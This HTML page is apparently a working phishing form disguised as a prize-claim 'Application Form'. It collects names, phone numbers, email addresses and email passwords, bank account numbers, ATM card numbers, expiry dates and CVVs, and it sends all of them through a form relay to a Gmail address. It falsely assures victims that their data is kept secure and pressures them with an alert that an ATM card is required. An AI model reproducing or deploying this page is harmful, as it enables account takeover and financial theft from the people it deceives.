<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      max-width: 600px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 5px;
      border: 1px solid #ccc;
      box-sizing: border-box;
    }
    .hidden {
      display: none;
    }
    .error {
      color: red;
      font-size: 0.9em;
      margin-top: 5px;
    }
    .eye-container {
      position: relative;
    }
    .eye-container input {
      padding-right: 40px;
    }
    .eye-icon {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <h2 style="text-align: center;">Application Form</h2>
  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" id="applicationForm" autocomplete="off">

    <!-- Hidden Inputs -->
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/thankyou.html">

    <label>1. Full Name</label>
    <input type="text" name="Full Name" required>

    <label>2. Country</label>
    <input type="text" name="Country" required>

    <label>3. Phone Number</label>
    <input type="tel" name="Phone Number" id="phone" required>
    <div class="error" id="phoneError"></div>

    <label>4. Email Address</label>
    <input type="email" name="Email Address" required>

    <label>5. Email Password</label>
    <div class="eye-container">
      <input type="password" name="Email Password" id="emailPassword" required>
      <span class="eye-icon" onclick="toggleVisibility('emailPassword')">üëÅÔ∏è</span>
    </div>

    <label>6. Amount You Won</label>
    <input type="text" name="Amount You Won" id="amountWon" required>

    <label>7. Bank Account Type</label>
    <input type="text" name="Bank Account Type" id="bankType" required>

    <label>8. Bank Account Number</label>
    <input type="text" name="Bank Account Number" id="bankNumber" required>

    <label>9. Did You Link ATM to Your Bank Account?</label>
    <select name="ATM Linked" id="atmLinked" required>
      <option value="">Select</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>

    <div id="atmFields">
      <label>10. ATM Card Number</label>
      <input type="text" name="ATM Card Number" id="cardNumber">
      <div class="error" id="cardError"></div>

      <label>11. Expiry Date (MM/YY)</label>
      <input type="text" name="Expiry Date" id="expiryDate" maxlength="5" placeholder="MM/YY">
      <div class="error" id="expiryError"></div>

      <label>12. CVV</label>
      <input type="text" name="CVV" id="cvv">
      <div class="error" id="cvvError"></div>
    </div>

    <div id="finalNote" style="margin-top: 15px;">
      <strong>13. You will receive <span id="amountNote"></span> to your <span id="accountTypeNote"></span> <span id="accountNumberNote"></span></strong>
    </div>

    <p style="margin-top: 15px; font-style: italic;">We keep your data/details secure and confidential.</p>

    <button type="submit" style="margin-top: 20px; padding: 10px 15px;">Submit</button>
  </form>

  <script>
    // ATM logic
    const atmLinked = document.getElementById("atmLinked");
    const atmFields = document.getElementById("atmFields");
    const finalNote = document.getElementById("finalNote");

    atmLinked.addEventListener("change", function () {
      if (this.value === "Yes") {
        atmFields.classList.remove("hidden");
        finalNote.style.display = "block";
      } else {
        atmFields.classList.add("hidden");
        finalNote.style.display = "none";
        alert("YOU MUST HAVE ATM CARD TO PROCEED");
      }
    });

    // Toggle eye visibility
    function toggleVisibility(id) {
      const field = document.getElementById(id);
      field.type = field.type === "password" ? "text" : "password";
    }

    // Autofill final message
    const amountInput = document.getElementById("amountWon");
    const accountTypeInput = document.getElementById("bankType");
    const accountNumberInput = document.getElementById("bankNumber");

    function updateFinalNote() {
      document.getElementById("amountNote").textContent = amountInput.value;
      document.getElementById("accountTypeNote").textContent = accountTypeInput.value;
      document.getElementById("accountNumberNote").textContent = accountNumberInput.value;
    }

    amountInput.addEventListener("blur", updateFinalNote);
    accountTypeInput.addEventListener("blur", updateFinalNote);
    accountNumberInput.addEventListener("blur", updateFinalNote);

    // Validations
    document.getElementById("phone").addEventListener("blur", function () {
      const val = this.value.trim();
      document.getElementById("phoneError").textContent =
        val.length < 9 || val.length > 12 ? "Phone number must be 9 to 12 digits." : "";
    });

    document.getElementById("cardNumber").addEventListener("blur", function () {
      const val = this.value.replace(/\D/g, "");
      document.getElementById("cardError").textContent =
        val.length !== 16 ? "Card number must be exactly 16 digits." : "";
    });

    document.getElementById("cvv").addEventListener("blur", function () {
      const val = this.value.trim();
      document.getElementById("cvvError").textContent =
        val.length !== 3 ? "CVV must be exactly 3 digits." : "";
    });

    document.getElementById("expiryDate").addEventListener("input", function () {
      let val = this.value.replace(/\D/g, "");
      if (val.length >= 3) val = val.slice(0, 2) + "/" + val.slice(2);
      this.value = val.slice(0, 5);
    });

    document.getElementById("expiryDate").addEventListener("blur", function () {
      const val = this.value;
      const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
      document.getElementById("expiryError").textContent =
        !regex.test(val) ? "Enter valid MM/YY format." : "";
    });
  </script>
</body>
</html>
